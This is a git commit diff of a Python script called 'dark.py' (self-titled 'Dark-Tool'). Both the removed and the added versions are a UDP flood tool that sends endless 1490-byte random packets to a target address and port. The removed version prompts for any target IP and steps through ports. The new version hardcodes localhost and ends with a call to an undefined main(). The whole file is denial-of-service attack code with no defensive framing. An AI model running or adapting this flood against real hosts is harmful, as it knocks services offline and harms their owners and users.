a0d1a090756c5c0b840b541ee50e81819d4080ed
Robert <44000916+robertpaschoal@users.noreply.github.com>
2020-08-31 13:22:28 -0300

    Add files via upload

--- dark.py
+++ dark.py
@@ -1,39 +1,28 @@
-import random,socket, os, sys, subprocess
-import string, thread
-from time import sleep
+#! usr/bin/env python
+#Libs
+import sys, os
+import random
+import socket
+from datetime import datetime
+
+#System Comands
 os.system("clear")
 
-from datetime import datetime
-now= datetime.now()
-hour= now.hour
-minute= now.minute
-second= now.second
+#Connection
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes=random._urandom(1490)
+#Bytes Random
+bytes = random._urandom(1490)
 
-print ("********************")
-print ("Welcome to Dark-Tool")
-print ("********************")
-
-nome=raw_input("Your Name:")
-
-print ("Wait.....")
-print ("So,%s,Tell Me The Ip") %(nome)
-
-print ("Targed Ip")
-ip=raw_input("Dark~:")
-
-print ("Targed Port")
-port=input("Dark~:")
-
-print ("So,%s, Wait a minute...") %(nome)
-
-print
-sent= 0
+#main()
+Alvo = "127.0.0.1"
+Port = 1
+sent = 0
+#time = sys.argv[3]
 while True:
-     sock.sendto(bytes,(ip,port))
-     sent= sent + 1
-     port= port + 1
-     print ("Sent %s packet to %s throught port:%s") %(sent,ip,port)
- 
+	s.sendto(bytes,(Alvo,Port))
+	sent = sent + 1
+	#tam = str("{} kb/s".format(len(sent)))
+	print ("Sending:{} Packets to:{} Throught Port:{}".format(sent, Alvo, Port)) 
+
+main()
